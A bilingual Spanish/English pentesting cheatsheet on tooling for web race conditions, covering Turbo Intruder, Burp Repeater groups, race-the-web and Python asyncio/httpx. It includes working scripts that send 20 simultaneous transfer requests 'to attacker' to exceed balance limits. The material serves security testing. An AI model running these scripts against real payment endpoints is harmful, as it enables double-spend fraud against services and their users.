---
aliases:
  - Turbo Intruder Race
  - race-the-web
  - asyncio race
tags:
  - type/cheatsheet
  - vuln/race-condition
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[Race Conditions]]'
  - '[[Burp Suite]]'
---
# Race Conditions - Tooling

***

## Turbo Intruder (Burp)

| **Función** | **Setup** | **Notas** |
|:---:|:---:|:---:|
| Instalar | Burp → Extensions → BApp Store → "Turbo Intruder" | Free PortSwigger. |
| HTTP/2 single-packet engine | `engine=Engine.BURP2` en script | Built-in técnica. |
| HTTP/1.1 last-byte sync | `engine=Engine.THREADED` con custom timing | Pipelining. |
| Default templates | Carpeta `examples/` con scripts de race | Punto de partida. |
| Right-click "Send to Turbo Intruder" | Send request desde Repeater/Proxy | UI integration. |
| Custom script Python embedded | Script en lenguaje Python con methods queueRequests/handleResponse | Programmable. |
| concurrentConnections | `concurrentConnections=1` para single-packet | Critical for racing. |
| pipeline option | `pipeline=False` típico para race | Sin pipelining. |
| Output table | UI table con responses + status + length | Visual triage. |
| Filter responses | `if interesting` decorator | Custom filtering. |
| Stop early | `engine.stop()` cuando race confirmed | Early exit. |
^race-tool-turbo

### Script Turbo Intruder race básico (single-packet)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2)
    
    req = '''POST /api/transfer HTTP/2
host: target.com
cookie: session=...
content-type: application/json

{"to":"attacker","amount":100}'''
    
    # 20 requests in single packet
    for _ in range(20):
        engine.queue(req)

def handleResponse(req, interesting):
    table.add(req)
```

___

## Burp Repeater "Send Group → Single Connection"

| **Función** | **Acción** | **Notas** |
|:---:|:---:|:---:|
| Crear group | Right-click tab → "Create tab group" | Group de N tabs. |
| Add a group | Drag tabs al group | UI. |
| Send group sequentially | Send 1-by-1 (default) | No race. |
| Send group → single connection | Right-click group tab → "Send group → in single connection" | Para race. |
| Send group parallel | Alternative: single packet (Burp Pro 2024+) | More precision. |
| Inspect timing | Response panel shows timing | Validate race window. |
| Modify per-request | Editar each tab independent → race con distintos params | Useful for chains. |
| Save group | Save tabs como project | Persistencia. |
| Limitation HTTP/1.1 | Funciona con keep-alive | HTTP/2 más preciso. |
| Combine con Macros | Pre-auth setup en Macros + race en Repeater | Workflow. |
^race-tool-burp-repeater

___

## race-the-web

| **Función** | **Comando** | **Notas** |
|:---:|:---:|:---:|
| Repo | `https://github.com/aaronhnatiw/race-the-web` | Go-based standalone. |
| Config TOML | `config.toml` con N requests + timing | Declarative. |
| Run | `race-the-web -config config.toml` | Single command. |
| Multiple workers | Concurrent goroutines | Default high concurrency. |
| Output JSON | Logs y resultados estructurados | Reportable. |
| Custom payloads | Templating en config | Flexible. |
| Combine con Burp | Proxy through Burp para inspect | Standard. |
| Verbose | `-verbose` flag | Debug. |
| Limitation no H2 | HTTP/1.1 only por default | Pre-Kettle 2023 paper. |
| Best for | Limit overrun simple scenarios | Quick CLI. |
^race-tool-rtw

___

## Python asyncio / aiohttp

| **Función** | **Code** | **Notas** |
|:---:|:---:|:---:|
| Instalación | `pip install aiohttp` | Async HTTP. |
| Concurrent requests | `asyncio.gather(*tasks)` | Standard pattern. |
| Custom timing | Manual control via `asyncio.sleep` | Tunear. |
| HTTP/2 support | Use `httpx` library con `http2=True` | Más moderno. |
| Multiple connections | `aiohttp.TCPConnector(limit=N)` | Pool size. |
| Single connection | Force pipelining manual | Low-level. |
| Fast.io | `httpx-async` alternative | Speed. |
| trio library | Alternative async runtime | Stylistic. |
| Custom race logic | Combine timing + state machine | Programmable. |
| Best for | Custom complex scenarios | Cuando Turbo Intruder no llega. |
^race-tool-python

### Script Python asyncio race

```python
import asyncio
import aiohttp

async def race(session, url, payload, sem):
    async with sem:
        async with session.post(url, json=payload, cookies={'session':'...'}) as resp:
            return resp.status, await resp.text()

async def main():
    sem = asyncio.Semaphore(20)
    async with aiohttp.ClientSession() as session:
        tasks = [
            race(session, 'https://target/api/transfer',
                 {'to':'attacker','amount':100}, sem)
            for _ in range(20)
        ]
        results = await asyncio.gather(*tasks)
        for status, body in results:
            print(status, len(body))

asyncio.run(main())
```

### HTTP/2 con httpx

```python
import asyncio
import httpx

async def race():
    async with httpx.AsyncClient(http2=True) as client:
        tasks = [
            client.post('https://target/api/transfer',
                        json={'to':'attacker','amount':100},
                        cookies={'session':'...'})
            for _ in range(20)
        ]
        responses = await asyncio.gather(*tasks)
        for r in responses:
            print(r.status_code)

asyncio.run(race())
```

___

## Otros Tools y Scripts

| **Tool** | **Uso** | **Notas** |
|:---:|:---:|:---:|
| `RaceForce` (Python) | https://github.com/Raz0r/RaceForce | Race condition testing. |
| `gRace` | Go-based con HTTP/2 support | Modern. |
| Burp `Repeater HTTP/2 inspector` | Built-in panel | Manual H2 race. |
| `wrk` | Stress test tool | Bulk concurrent. |
| `vegeta` | HTTP load tester | Same. |
| Browser DevTools | Network panel pause + replay | Manual. |
| Locust | Distributed load test | Bulk patterns. |
| Hey | Apache bench replacement | Concurrent baseline. |
| `siege` | Stress benchmark | Race-ish. |
| Custom Bash + xargs | Quick & dirty | `seq N \| xargs -P N curl ...` |
| Burp Intruder con threads | "Pitchfork" + 50 threads | Single-packet aproximación. |
^race-tool-others

***
